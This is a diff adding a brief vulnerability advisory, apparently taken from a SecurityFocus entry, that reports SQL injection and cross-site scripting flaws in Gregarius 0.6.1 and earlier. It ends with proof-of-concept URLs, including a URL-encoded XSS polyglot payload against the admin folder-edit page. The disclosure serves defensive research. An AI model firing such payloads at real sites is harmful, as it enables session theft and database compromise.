@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/51338/info
+
+Gregarius is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Gregarius versions 0.6.1 and prior are vulnerable. 
+
+http://www.example.com/?page=1[it'shere]&media=rss&
+http://www.example.com/admin/index.php?domain=folders&action=edit&fid=8[it'shere xss with sql]
+http://www.example.com/admin/index.php?domain=folders&action=edit&fid=8%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E 
